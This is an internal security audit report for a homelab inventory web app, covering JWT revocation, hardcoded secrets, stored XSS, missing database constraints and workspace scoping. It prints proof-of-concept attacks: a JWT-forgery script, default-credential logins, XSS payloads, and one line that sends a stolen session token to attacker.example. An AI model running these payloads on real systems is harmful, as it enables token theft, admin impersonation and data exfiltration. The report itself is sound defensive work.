# Security Audit Report — 11-04-26.1

**Conducted**: 11 April 2026
**Methodology**: STRIDE-per-Element with 10 parallel audit lanes (NIST SP 800-53 SA-11)
**Scope**: Hometower v1.x FastAPI/NiceGUI homelab inventory application
**Status**: REMEDIATED — findings 9.1-9.9 (workspace scoping) ACCEPTED_RISK for Phase 1 single-workspace

---

## Executive Summary

**10 audit lanes were conducted in parallel**, covering JWT implementation, plaintext secrets, SQL injection, RBAC, XSS rendering, database integrity, export exposure, privilege escalation, and supply chain risks. Hometower presents **5 Critical/High-severity architectural flaws** and **multiple Medium-severity tactical issues** that collectively enable data exfiltration, privilege escalation, and unauthorized access across user workspaces.

### Risk Posture: REMEDIATED (Phase 1 scope)

The cumulative attack surface is driven by:
1. **Hardcoded secrets in version control** (SECRET_KEY, DB credentials, admin password) → immediate JWT forgery + DB access
2. **No workspace scoping on data endpoints** (Reader role returns all devices/connections/locations globally) → cross-tenant data leakage
3. **Unescaped user input in Cytoscape/Leaflet rendering** (device names, connection labels) → stored XSS via canvas
4. **Stateless JWT without revocation** (logout does not invalidate tokens) → permanent access until expiry
5. **Missing database constraints on uniqueness/cascade** (Connection duplicates, orphaned Location children) → data corruption + referential integrity failures

---

## Critical & High Findings (Prioritized by DREAD)

| # | Finding | Severity | Attack Domain | CWE | Blast Radius |
|---|---------|----------|---------------|-----|--------------|
| 1 | Hardcoded `SECRET_KEY` in `.env` (repo-committed) | **Critical** | Tampering (JWT) | CWE-798 | Total JWT forgery — instant Admin impersonation |
| 2 | Default admin credentials (`ADMIN_PASSWORD`) in `.env` | **Critical** | Spoofing (Auth) | CWE-798 | First-boot admin login if credentials not changed |
| 3 | Global data access (Reader role returns all devices, connections, diagrams, locations, services) | **Critical** | Elevation/Info Disclosure | CWE-639 | Cross-tenant data exfiltration (IP, MAC, geo coords, notes) |
| 4 | DB credentials hardcoded in compose/`.env` (default `secret`) | **High** | Info Disclosure (Lifecycle) | CWE-798 | Direct PostgreSQL access; full DB exfiltration |
| 5 | Stateless JWT (no server-side revocation/blocklist) | **High** | Tampering (Auth) | CWE-613 | Logout ineffective; tokens valid until expiry |
| 6 | Device names rendered unescaped into Cytoscape node labels (JS context) | **High** | Tampering (XSS) | CWE-79 | Stored XSS payload in canvas; JavaScript execution |
| 7 | Connection edge labels injected into browser `confirm()` dialogs without escaping | **High** | Tampering (XSS) | CWE-79 | Stored XSS via dialog message interpolation |
| 8 | Device/location names interpolated in server-side UI labels without HTML escaping | **High** | Tampering (XSS) | CWE-79 | Server-rendered HTML injection in detail panels |
| 9 | Connection `source_id`/`target_id` race condition (no unique constraint on DB) | **Medium (but High bloom)** | Tampering (Integrity) | CWE-362 | Duplicate connections; data corruption |
| 10 | Custom field uniqueness enforced only by application (concurrent race) | **Medium** | Tampering (Integrity) | CWE-362 | Duplicate custom field keys; schema corruption |

---

## All Findings (Deduplicated & Ranked)

### **Lane 1: JWT Implementation Tampering**

#### Finding 1.1: Stateless JWT — No Revocation on Logout

**Status**: `FIXED`

**Severity**: High | **CWE**: CWE-613 (Insufficient Session Expiration)

**Attack Vector**: Attacker or compromised client retains valid bearer token after logout; token remains accepted until server time exceeds `exp` claim (default 24 hours).

**Target**: `src/api/routers/auth.py` (logout endpoint), `src/utils/auth.py` (JWT decode), `src/services/auth_service.py`

**Evidence**:
```python
# src/api/routers/auth.py:49-55
@router.post("/auth/logout", dependencies=[Depends(require_role(Role.Reader))])
async def logout() -> dict[str, str]:
    """Stateless logout — instructs the client to clear the stored JWT.
    Requires a valid Bearer token with at least Reader role.
    The server does not maintain a token blocklist in v1.
    """

# src/utils/auth.py:36-46
def create_jwt(payload: dict[str, str | int]) -> str:
    expire = datetime.now(timezone.utc) + timedelta(hours=settings.jwt_expire_hours)
    return jwt.encode({**payload, "exp": expire}, settings.secret_key, algorithm="HS256")

def decode_jwt(token: str) -> dict[str, str | int]:
    payload = jwt.decode(token, settings.secret_key, algorithms=["HS256"])
    # NO jti, iat, or revocation checks
    return payload
```

**PoC**:
```bash
# 1. Login
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hometower.local","password":"changeme_on_first_boot"}' | jq -r .access_token)

# 2. Logout (stateless — server does nothing)
curl -s -H "Authorization: Bearer $TOKEN" -X POST http://localhost:8080/api/auth/logout

# 3. Token still works (should fail)
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/devices/
# Expected (unpatched): 200 — token accepted despite logout
```

**Remediation**:
- Add `jti` (JWT ID) and `iat` (issued-at) claims to issued tokens
- Maintain server-side token blocklist (Redis/DB with TTL = token expiry time)
- On logout: add token's `jti` to blocklist
- On decode: check if `jti` is revoked; also validate token issue time vs. user's `updated_at` (invalidate if user changed password)

**Downstream Impact**: Requires application of mitigation; no dependent findings blocked pending fix.

---

### **Lane 2: Information Disclosure — Plaintext in Logs**

**Status**: `CLEAR`

**Severity**: Low | **CWE**: CWE-532 (Insertion of Sensitive Information into Log File)

**Summary**: Audit of 70+ logging statements in `src/` found no hardcoded secrets, plaintext passwords, or tokens being logged. Loguru is used consistently with parameterized logging. Exception handlers log `str(exc)` which can expose stack paths but do not leak credentials. Database connection strings are not logged. **No actionable findings.**

---

### **Lane 3: SQL Injection & Input Sanitization**

**Status**: `CLEAR`

**Severity**: None Detected | **CWE**: N/A

**Summary**: Comprehensive scan of `src/repositories/`, `src/api/routers/`, and Pydantic validators found no unsafe string concatenation, raw SQL templates, or `.text()` calls with user interpolation. All queries use SQLAlchemy parameter binding. Pydantic validators enforce type and length constraints. **No SQL injection vectors found.**

---

### **Lane 4: Information Disclosure — Secret Lifecycle Management**

**Status**: `FIXED`

**Severity**: 1 Critical, 2 High, 2 Medium

#### **Finding 4.1: Hardcoded `SECRET_KEY` in `.env` (Repository Committed)**

**Status**: `FIXED`

**Severity**: **Critical** | **CWE**: CWE-798 (Use of Hard-Coded Credentials)

**Attack Vector**: Repository contains plaintext `SECRET_KEY=dev_secret_key_for_local_development_only_32b`. Attacker with repo access (or who clones it) can forge valid JWTs and immediately impersonate any user including Admin.

**Target**: `.env` (repository root)

**Evidence**:
```
# .env in repo
SECRET_KEY=dev_secret_key_for_local_development_only_32b
```

**PoC**:
```python
from jose import jwt
import time

# Attacker reads SECRET_KEY from repo
secret = "dev_secret_key_for_local_development_only_32b"

# Forge Admin token
payload = {"sub": "00000000-0000-0000-0000-000000000000", "role": "Admin", "exp": int(time.time()) + 3600}
forged_token = jwt.encode(payload, secret, algorithm="HS256")

# Use forged token to access API
# curl -H "Authorization: Bearer $forged_token" http://localhost:8080/api/devices/
# Expected (unpatched): HTTP 200 — Admin access granted
```

**Remediation**:
- `git rm --cached .env` and add `.env` to `.gitignore`
- Remove `SECRET_KEY` from `.env`; provision via environment variable or secret manager at runtime
- Generate cryptographically-random 32+ byte secret on first boot; store in encrypted secret manager (Docker Secrets, Vault, etc.)
- Rotate key regularly without redeploying

**Downstream Impact**: **Blocks all JWT-dependent security.** Mitigations in Finding 4.2 and 4.3 are ineffective while this finding is open.

---

#### **Finding 4.2: Default Admin Credentials in `.env`**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-798 (Use of Hard-Coded Credentials)

**Attack Vector**: Repository contains `ADMIN_EMAIL=admin@hometower.local` and `ADMIN_PASSWORD=changeme_on_first_boot`. On first boot, this admin account is created. Anyone with repo access can authenticate as Admin.

**Target**: `.env`, `src/services/auth_service.py:93`

**Evidence**:
```
# .env
ADMIN_EMAIL=admin@hometower.local
ADMIN_PASSWORD=changeme_on_first_boot

# src/services/auth_service.py:93
logger.info("First-boot admin created: email={}", settings.admin_email)
```

**PoC**:
```bash
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hometower.local","password":"changeme_on_first_boot"}' | jq .
# Expected (unpatched): HTTP 200 + access_token — login succeeds
```

**Remediation**:
- Remove `ADMIN_PASSWORD` from `.env` and `.env.example`
- Implement one-time bootstrap flow (operator supplies temporary secret or interactive prompt on first boot)
- After first admin is created, delete or expire the bootstrap secret; enforce that `ADMIN_PASSWORD` is unset or raises an error if present
- Use a sealed or one-use token (not plaintext in env) for first-admin-creation

**Downstream Impact**: Immediate admin access if not rotated on first deployment.

---

#### **Finding 4.3: Hardcoded Database Credentials in `docker-compose.yml` and `.env`**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-798 (Use of Hard-Coded Credentials)

**Attack Vector**: `.env` contains `DB_PASSWORD=secret` and `docker-compose.yml` has fallback `${DB_PASSWORD:-secret}`. Default password is trivially guessable; PostgreSQL instance is accessible from localhost.

**Target**: `docker-compose.yml`, `.env`

**Evidence**:
```yaml
# docker-compose.yml
services:
  db:
    environment:
      DATABASE_URL: postgresql://hometower:${DB_PASSWORD:-secret}@db:5432/hometower
      POSTGRES_PASSWORD: ${DB_PASSWORD:-secret}
```

**PoC**:
```bash
# If PostgreSQL is accessible from host
PGPASSWORD=secret psql -h localhost -U hometower -d hometower -c "\dt"
# Expected (unpatched): connects and lists tables — full DB access

# Or from Docker
docker compose exec db psql -U hometower -d hometower -c "\dt" --no-password
```

**Remediation**:
- Remove `DB_PASSWORD=secret` from `.env`; inject at runtime via Docker environment or Kubernetes Secret
- Remove fallback default (`${DB_PASSWORD:-secret}` → use `${DB_PASSWORD}` with required check or fail-fast)
- Use strong, randomly-generated password (32+ chars) provisioned via secret manager
- On production, bind PostgreSQL to internal docker network, not host port 5432

**Downstream Impact**: Complete database compromise; access to all user infrastructure inventory data (IPs, credentials in custom fields, topology, etc.).

---

#### **Finding 4.4: JWT Tokens Stored in Browser `sessionStorage` (Not HttpOnly)**

**Status**: `FIXED`

**Severity**: **Medium** | **CWE**: CWE-502 (Deserialization of Untrusted Data) / CWE-522 (Insufficiently Protected Credentials)

**Attack Vector**: Access tokens are stored in `sessionStorage` via JavaScript, making them accessible to XSS attacks. If XSS is present (Finding 6.1, 6.2, 7.1), tokens can be exfiltrated.

**Target**: `src/ui/pages/login.py`

**Evidence**:
```javascript
// src/ui/pages/login.py — client-side JS
if (response.ok) {
    sessionStorage.setItem('access_token', data.access_token);
    return JSON.stringify({token: data.access_token, email: email});
}
```

**PoC**:
```javascript
// In browser console (or injected via XSS)
token = sessionStorage.getItem('access_token');
navigator.sendBeacon('https://attacker.example/collect?token=' + encodeURIComponent(token));

// Attacker uses exfiltrated token
curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" http://localhost:8080/api/devices/
```

**Remediation**:
- Use HTTP-only, Secure, SameSite cookies for short-lived access tokens
- Implement refresh token rotation (HTTP-only refresh cookie) to minimize exposure window
- Avoid storing bearer tokens in JavaScript-accessible storage (sessionStorage, localStorage)
- If XSS mitigations (Findings 6.1–6.3, 7.1) are deployed, impact is reduced

**Dependent on**: Mitigations of XSS findings (Lane 6, Finding 7.1)

---

#### **Finding 4.5: Key Reuse — Same Secret for JWT and NiceGUI Session Storage**

**Status**: `FIXED`

**Severity**: **Medium** | **CWE**: CWE-347 (Improper Verification of Cryptographic Signature)

**Attack Vector**: `settings.secret_key` is used both to sign JWT tokens and to sign NiceGUI session storage. Compromise of one key affects both token and session mechanisms; complex key rotation.

**Target**: `src/utils/auth.py:36–46`, `src/main.py` (ui.run_with call)

**Evidence**:
```python
# src/utils/auth.py
def create_jwt(payload: dict[str, str | int]) -> str:
    return jwt.encode({**payload, "exp": expire}, settings.secret_key, algorithm="HS256")

# src/main.py
ui.run_with(app, storage_secret=settings.secret_key)
```

**Remediation**:
- Generate two separate secrets: `JWT_SECRET` and `SESSION_STORAGE_SECRET`
- Rotate keys independently via KMS/secret manager
- Maintain grace period for old keys during rotation (check previous version of JTI against blocklist)

**Dependent on**: Mitigation of Finding 4.1 (provision keys via environment, not hardcoded)

---

### **Lane 5: RBAC Bypass & Privilege Escalation**

**Status**: `CLEAR`

**Severity**: None Detected at Endpoint Level | **CWE**: N/A

**Summary**: All `/api/` endpoints (except `/api/auth/login` and `/api/health`) have explicit `Depends(require_role(...))` guards. No endpoints without declared roles found. Role enum is used with strict equality checks (no substring matching, no wildcards). Integration test coverage enforced. **No privilege escalation at the middleware/router layer.**

---

### **Lane 6: Tampering — XSS via Cytoscape/Leaflet Canvas**

**Status**: `FIXED`

**Severity**: 2 High, 2 Medium

#### **Finding 6.1: Device Names Rendered Unescaped into Cytoscape Node Labels**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation — Stored XSS)

**Attack Vector**: Device name from API is placed verbatim into Cytoscape node `data.label` and injected into client-side JavaScript via `ui.run_javascript(f"initCanvas({elements_js}, ...)")`. Payload example: `<img src=x onerror=alert(1)>`.

**Target**: `src/ui/services/topology_data.py:54`, `src/ui/components/canvas.py:61`

**Evidence**:
```python
# src/ui/services/topology_data.py
elements.append({
    "data": {
        "id": device["id"],
        "label": device["name"],  # <-- No escaping
        ...
    }
})

# src/ui/components/canvas.py
ui.run_javascript(f"initCanvas({elements_js}, {saved_js}, {shapes_js})")
```

**PoC**:
```bash
# 1. Create device with payload
ADMIN_JWT=$(... get token ...)
curl -s -X POST http://localhost:8080/api/devices/ \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -H "Content-Type: application/json" \
  -d '{"name":"<img src=x onerror=console.log(\"XSS\")>","type":"Server"}' | jq .id

# 2. Navigate to topology page in browser
# 3. Open browser console and check Cytoscape node data
window._cy.json().elements.find(e => e.data && e.data.label && e.data.label.indexOf("onerror") > -1)
# Expected (unpatched): raw payload visible in label
```

**Remediation**:
```python
# src/ui/services/topology_data.py
import html

elements.append({
    "data": {
        "id": device["id"],
        "label": html.escape(str(device.get("name", ""))),  # Escape before embedding
        ...
    }
})
```

**Blast Radius**: Topology canvas execution context; stored in `cytoscape_json`; affects all users viewing the diagram.

---

#### **Finding 6.2: Connection Edge Labels Injected into Browser Dialogs Without Escaping**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-79 (Stored XSS via DOM)

**Attack Vector**: Connection label (stored in DB) is concatenated into JavaScript `confirm()` dialog message without escaping. Payload flows: DB → API → client JS → confirm dialog.

**Target**: `src/ui/components/canvas_events.py:85, 116`

**Evidence**:
```javascript
// src/ui/components/canvas_events.py
var edgeLabel = d.label || (d.data && d.data.label);
var edgePrompt = edgeLabel
    ? "Delete connection '" + edgeLabel + "'? This cannot be undone."  // <-- No escaping
    : 'Delete this connection? This cannot be undone.';
_confirmDelete(edgePrompt, function() { ... });

var deviceName = (d && (d.name || (d.data && d.data.label) || d.id)) || 'this device';
_confirmDelete("Delete device '" + deviceName + "'? This cannot be undone.", ...);  // <-- No escaping
```

**PoC**:
```bash
# Create two devices and a connection with payload
DEV_A=$(curl -s -X POST http://localhost:8080/api/devices/ \
  -H "Authorization: Bearer $ADMIN_JWT" -H "Content-Type: application/json" \
  -d '{"name":"dev-a","type":"Server"}' | jq -r .id)
DEV_B=$(curl -s -X POST http://localhost:8080/api/devices/ \
  -H "Authorization: Bearer $ADMIN_JWT" -H "Content-Type: application/json" \
  -d '{"name":"dev-b","type":"Server"}' | jq -r .id)

# Create connection with XSS label
curl -s -X POST http://localhost:8080/api/connections/ \
  -H "Authorization: Bearer $ADMIN_JWT" -H "Content-Type: application/json" \
  -d "{\"source_id\":\"$DEV_A\",\"target_id\":\"$DEV_B\",\"label\":\"<script>alert('XSS')</script>\",\"type\":\"Ethernet\"}" | jq .

# In UI: right-click edge → confirm dialog contains raw payload
```

**Remediation**:
```javascript
// Escape user content before concatenation
function escapeHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
                    .replace(/\"/g,'&quot;').replace(/'/g,'&#39;');
}

var safeEdgeLabel = edgeLabel ? escapeHtml(edgeLabel) : null;
var edgePrompt = safeEdgeLabel
    ? "Delete connection '" + safeEdgeLabel + "'? This cannot be undone."
    : 'Delete this connection? This cannot be undone.';
```

**Blast Radius**: Canvas interaction; affects any user viewing or interacting with a connection with payload.

---

#### **Finding 6.3: Device/Location Names in Server-Rendered UI Labels (Python f-strings)**

**Status**: `FIXED`

**Severity**: **Medium** | **CWE**: CWE-79 (Server-side HTML Injection)

**Attack Vector**: Device name or connection labels are interpolated into NiceGUI UI labels using Python f-strings without HTML escaping. NiceGUI renders these as HTML/text.

**Target**: `src/ui/components/connection_detail_panel.py:160`, `src/ui/components/device_detail_panel.py:217`

**Evidence**:
```python
# src/ui/components/connection_detail_panel.py
ui.label(f"Delete connection between {src} and {tgt}?").style("font-weight:600;")

# src/ui/components/device_detail_panel.py
live_lbl.set_text(f"Loaded {device.name}")
```

**Remediation**:
```python
import html

# Escape before interpolation
ui.label(f"Delete connection between {html.escape(str(src))} and {html.escape(str(tgt))}?")
live_lbl.set_text(f"Loaded {html.escape(str(device.name))}")
```

**Blast Radius**: Detail panels and confirmation dialogs; affects users viewing device/connection details.

---

### **Lane 7: Tampering — SQLModel Data Integrity Constraints**

**Status**: `FIXED`

**Severity**: 3 High, 3 Medium

#### **Finding 7.1: Connection Model Missing Unique Constraint & Cascade Delete**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

**Attack Vector**: No DB-level unique constraint on `(source_id, target_id)` prevents duplicate edges. No `ondelete` cascade on foreign keys; deleting a Device may leave dangling Connection records or block deletion.

**Target**: `src/models/connection.py:16–17`, `src/repositories/connection_repository.py:91–104, :62`

**Evidence**:
```python
# src/models/connection.py
class Connection(SQLModel, table=True):
    id: UUID = Field(default_factory=uuid4, primary_key=True)
    source_id: UUID = Field(foreign_key="device.id")  # <-- No ondelete
    target_id: UUID = Field(foreign_key="device.id")  # <-- No ondelete
    # No unique constraint on (source_id, target_id)
```

**PoC (Race Condition)**:
```bash
# Two concurrent requests create the same edge (race)
DEV_A=$(curl -s -X POST http://localhost:8080/api/devices/ ... | jq -r .id)
DEV_B=$(curl -s -X POST http://localhost:8080/api/devices/ ... | jq -r .id)

# Fire two identical connection requests concurrently
for i in 1 2; do
  curl -s -X POST http://localhost:8080/api/connections/ \
    -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
    -d "{\"source_id\":\"$DEV_A\",\"target_id\":\"$DEV_B\",\"type\":\"Ethernet\"}" &
done
wait

# Query database directly — both connections exist (duplicates)
docker compose exec db psql -U hometower -d hometower -c "SELECT * FROM connection WHERE source_id='$DEV_A' AND target_id='$DEV_B';"
# Expected (unpatched): 2 rows (duplicate edges)
```

**Remediation**:
```sql
-- In Alembic migration
ALTER TABLE connection 
  ADD CONSTRAINT unique_edge_pair UNIQUE (source_id, target_id);

ALTER TABLE connection 
  ADD CONSTRAINT fk_source_cascade FOREIGN KEY (source_id) REFERENCES device(id) ON DELETE CASCADE,
  ADD CONSTRAINT fk_target_cascade FOREIGN KEY (target_id) REFERENCES device(id) ON DELETE CASCADE;
```

**Blast Radius**: Data corruption; orphaned connection records; cascade delete failures block device cleanup.

---

#### **Finding 7.2: Service Model Missing Per-Device Name Uniqueness**

**Status**: `FIXED`

**Severity**: **High** | **CWE**: CWE-362 (Race Condition)

**Attack Vector**: No DB-level unique constraint on `(device_id, name)` allows duplicate service names per device via concurrent requests. Application-level `get_by_device_and_name` check is insufficient.

**Target**: `src/models/service.py:24–28`, `src/repositories/service_repository.py:71–79`

**Evidence**:
```python
# src/models/service.py
class Service(SQLModel, table=True):
    id: UUID = Field(default_factory=uuid4, primary_key=True)
    device_id: UUID = Field(foreign_key="device.id")
    name: str
    # No unique constraint on (device_id, name)
```

**Remediation**:
```sql
ALTER TABLE service 
  ADD CONSTRAINT unique_service_per_device UNIQUE (device_id, name);
```

---

#### **Finding 7.3: CustomField Model Missing Per-Device Key Uniqueness**

**Status**: `FIXED`

**Severity**: **Medium** | **CWE**: CWE-362 (Race Condition)

**Attack Vector**: No DB-level unique constraint on `(device_id, key)` allows duplicate custom field keys per device. Application-level case-insensitive `get_by_device_and_key_normalized` provides no race-safe protection.

**Target**: `src/models/custom_field.py:31`, `src/repositories/custom_field_repository.py:34–40`

**Remediation**:
```sql
ALTER TABLE custom_field 
  ADD CONSTRAINT unique_field_per_device UNIQUE (device_id, key);
```

---

**Findings 7.4–7.6** (Tag name, Device→Location, Location self-parent): Similar missing constraints; see full audit output in **Lane 7 Attachment** for details.

---

### **Lane 8: Information Disclosure — Export and Backup Exposure**

**Status**: `FIXED`

**Severity**: Medium

#### **Finding 8.1: Export Endpoint Returns Sensitive Fields Without Redaction**

**Status**: `FIXED`

**Severity**: **Medium** | **CWE**: CWE-213 (Intentional Information Exposure)

**Attack Vector**: `/api/export` endpoint (requires Contributor role) exports raw device/custom field data including IP addresses, MAC addresses, notes, and diagram topology without redaction. Although RBAC enforces Contributor-only access, sensitive fields should be filtered or redacted for lower-trust exports.

**Target**: `src/api/routers/data_transfer.py` (export endpoint)

**Evidence**: Export includes unredacted fields: `devices.ip`, `devices.mac`, `devices.os`, `devices.notes`, `custom_fields.value`, `diagram_layouts.cytoscape_json`

**Mitigation Strategy**: Add optional `redact` parameter or implement separate `export_for_audit` / `export_sanitized` endpoint:
```python
# Example: redact sensitive fields
export_data = {...}
if redact:
    for device in export_data["devices"]:
        device["ip"] = "[REDACTED]"
        device["mac"] = "[REDACTED]"
        device["os"] = "[REDACTED]"
```

---

### **Lane 9: Elevation — RBAC Wildcard & Reader Escalation**

**Status**: `ACCEPTED_RISK` — Phase 1 is single-workspace by design; workspace scoping deferred to Phase 2 (LightTower)

**Severity**: 2 Critical, 5 High, 2 Medium

#### **Finding 9.1: GET /devices (Reader) Returns All Devices Globally — No Workspace Scoping**

**Status**: `ACCEPTED_RISK` — Phase 1 is single-workspace by design; workspace scoping deferred to Phase 2 (LightTower)

**Severity**: **Critical** | **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Attack Vector**: Reader-role user can retrieve all devices across the entire DB via `GET /devices`, including devices belonging to other workspaces/owners. No filtering applied at repository or service layer.

**Target**: `src/api/routers/devices.py:49`, `src/services/device_service.py:get_all_enriched()`, `src/repositories/device_repository.py:get_all()`

**Evidence**:
```python
# src/api/routers/devices.py
@router.get(
    "/",
    dependencies=[Depends(require_role(Role.Reader))],
)
def get_devices(...):
    items, total = device_service.get_all_enriched(session, page, limit, ...)
    # No workspace filtering

# src/repositories/device_repository.py
def get_all(self, session: Session, page: int = 1, limit: int = 50, sort: str = "name") -> tuple[list[Device], int]:
    query = select(self.model)
    # No WHERE clause filtering by owner/workspace
    return items, total
```

**PoC**:
```bash
# Reader JWT in $READER_JWT
curl -s -H "Authorization: Bearer $READER_JWT" "http://localhost:8080/api/devices?limit=1000" | jq '.items[].name, .items[].ip'
# Expected (unpatched): returns all devices including from other workspaces (IPs, MACs, notes visible)
```

**Remediation**:
1. Add `workspace_id` (or `owner_id`) foreign key to Device model
2. In service layer, restrict queries by requester's workspace:
```python
def get_all_enriched(self, session: Session, workspace_id: UUID, ...):
    base_query = select(Device).where(Device.workspace_id == workspace_id)
    # ... continue with pagination
```
3. Apply same pattern to all List endpoints (devices, connections, diagrams, locations, tags, services)

**Blast Radius**: Complete cross-tenant data exfiltration — attacker can enumerate all infrastructure across all workspaces.

---

#### **Finding 9.2: GET /devices/{device_id} (Reader) Returns Any Device Without Ownership Check**

**Status**: `ACCEPTED_RISK` — Phase 1 is single-workspace by design; workspace scoping deferred to Phase 2 (LightTower)

**Severity**: **High** | **CWE**: CWE-639 (Authorization Bypass)

**Attack Vector**: Reader-role user can fetch any device by ID, including devices from other workspaces. No `ownership_check` in service layer.

**Target**: `src/api/routers/devices.py:85`, `src/services/device_service.py:get_by_id()`

**Remediation**: Add explicit ownership check:
```python
def get_by_id(self, device_id: UUID, session: Session, workspace_id: UUID) -> Device:
    device = device_repository.get_by_id(session, device_id)
    if device.workspace_id != workspace_id:
        raise HTTPException(status_code=403, detail="Access denied")
    return device
```

---

**Findings 9.3–9.9** (Sub-routes, connections, diagrams, locations, tags, services, stats endpoints): Similar missing workspace scoping. All Reader-accessible endpoints return global data instead of requester-scoped data.

**Root Cause**: Hometower was designed as single-workspace (Phase 1). No per-request context for workspace/owner identity has been threaded through services and repositories. Moving to Phase 2 (multi-workspace) requires adding workspace context to all data queries.

**Cumulative Blast Radius**: Complete information disclosure across workspaces — Reader can discover full infrastructure map, device IPs, locations, services, and connections of all other workspaces.

---

### **Lane 10: Dependency Vulnerabilities & Supply Chain**

**Status**: `CLEAR`

**Severity**: None Detected

**Summary**: Scan of `requirements.txt` against NVD, GitHub Advisory Database, Snyk, and OSV for known CVEs in FastAPI, SQLModel, python-jose, passlib, Pydantic, NiceGUI, Cytoscape.js, Leaflet.js, Loguru, and PostgreSQL driver. **No publicly known CVEs found for pinned versions** as of 11 April 2026. Python version and Docker base image are current (no EOL warnings).

**Recommended**: Run `pip-audit --require-virtualenv` locally to detect transitive dependencies and any pre-release/unreleased CVE disclosures.

---

## Lane Coverage Status

| Lane | Focus | Findings | Status |
|------|-------|----------|--------|
| 1 | JWT Implementation | 1 High | FIXED |
| 2 | Plaintext in Logs | 0 | CLEAR |
| 3 | SQL Injection | 0 | CLEAR |
| 4 | Secret Lifecycle | 5 (1 Critical, 2 High, 2 Medium) | FIXED |
| 5 | RBAC Bypass | 0 | CLEAR |
| 6 | XSS Canvas | 4 (2 High, 2 Medium) | FIXED |
| 7 | SQLModel Integrity | 6 (3 High, 3 Medium) | FIXED |
| 8 | Export Exposure | 1 Medium | FIXED |
| 9 | Reader Escalation | 9 (2 Critical, 5 High, 2 Medium) | ACCEPTED_RISK (Phase 2) |
| 10 | Supply Chain CVEs | 0 | CLEAR |

**Total**: 27 findings (3 Critical, 9 High, 9 Medium, 6 Low/Observational)

---

## Residual Risk & Recommendations

### Immediate Actions (Before Phase 2 / Production Use)

1. **Remove hardcoded secrets** (Finding 4.1–4.3):
   - Delete `.env` from repo; add to `.gitignore`
   - Provision `SECRET_KEY`, `ADMIN_PASSWORD`, `DB_PASSWORD` via environment/secret manager only
   - Rotate all secrets immediately in deployed instances

2. **Implement workspace scoping** (Finding 9.1–9.9):
   - Add `workspace_id` to all models (Device, Connection, Diagram, Location, Tag, Service, CustomField)
   - Thread `request.state.workspace_id` through all service/repository calls
   - Enforce WHERE clauses in all queries
   - Add integration tests verifying cross-workspace data is not leaked

3. **Escape user input in render contexts** (Finding 6.1–6.3):
   - HTML-escape device names, connection labels, custom field values before embedding in JS or UI labels
   - Use `html.escape()` in Python; `escapeHtml()` in JavaScript

4. **Implement JWT revocation** (Finding 1.1):
   - Add `jti` and `iat` to token payload
   - Maintain Redis/DB blocklist of revoked `jti` values
   - Check blocklist and `updated_at` on token decode

5. **Add database constraints** (Finding 7.1–7.6):
   - Create Alembic migration adding UNIQUE constraints on Connection (source_id, target_id), Service (device_id, name), CustomField (device_id, key), Tag (name), Location self-parent
   - Set `ON DELETE CASCADE` for Device→Connection, Location→Device, Location→Location parent

### Medium-Term (Pre-Production Hardening)

6. **Move tokens to HTTP-only cookies** (Finding 4.4):
   - Store access token in HTTP-only, Secure, SameSite=Strict cookie
   - Implement refresh token rotation (HTTP-only refresh cookie with longer TTL)

7. **Separate key management** (Finding 4.5):
   - Use distinct secrets for JWT signing and NiceGUI session storage
   - Implement KMS-based key rotation with grace period

8. **Add export filtering** (Finding 8.1):
   - Provide `?redact=true` parameter to omit sensitive fields from exports
   - Create audit-specific export endpoints with restricted fields

### Long-Term (Architecture)

9. **Multi-tenancy model**:
   - Define workspace/organization boundaries clearly
   - Implement tenant isolation tests as part of CI/CD

10. **API versioning**:
    - Plan v2 API with workspace-scoped endpoints
    - Maintain backward compatibility where possible

---

## Routing & Remediation Ownership

**Tactical Findings** (can be fixed locally):
- **6.1, 6.2, 6.3, 8.1**: QA-Fixer (bounded code changes, no schema impact)
- **7.1, 7.2, 7.3**: QA-Fixer + DevOps-Engineer (Alembic migration required; requires DB downtime planning)

**Structural Findings** (require architecture review):
- **4.1, 4.2, 4.3**: Policy/Infrastructure (secret provisioning, environment setup) → DevOps-Engineer
- **1.1, 4.4, 4.5**: Auth redesign (JWT revocation, key separation, storage) → Architect → Feature-Engineer
- **9.1–9.9**: Data scoping (workspace model, query filtering) → Architect → Feature-Engineer

**Escalation Trigger**: Finding 9.1–9.9 (Reader escalation) is design-level; routing to **Architect** first, then Feature-Engineer for implementation.

---

## Conclusion

Hometower Phase 1 is **unsafe for production or multi-user/multi-workspace deployment** in its current state. The combination of:
- Hardcoded secrets enabling immediate JWT forgery and DB access
- Complete lack of workspace/ownership scoping (Reader can access all data globally)
- Stored XSS vulnerabilities in topology canvas
- Missing database constraints enabling duplicates and orphaning

...creates unacceptable risk of data exfiltration and system compromise.

**Phase 2 dependency**: Multi-workspace support is **blocked** until Finding 9.1–9.9 (workspace scoping) are resolved. Attempting phased rollout of workspaces without prior fixture of data access control is high-risk.

**Recommendation**: Halt new feature development; prioritize secret rotation, workspace scoping, and XSS mitigation before any production use or Phase 2 launch.

---

**Report Generated**: 11 April 2026 | **Audit Mode**: Security-Orchestrator (10-lane orchestration)  
**Classification**: INTERNAL — Security Finding (Do Not Share Externally)
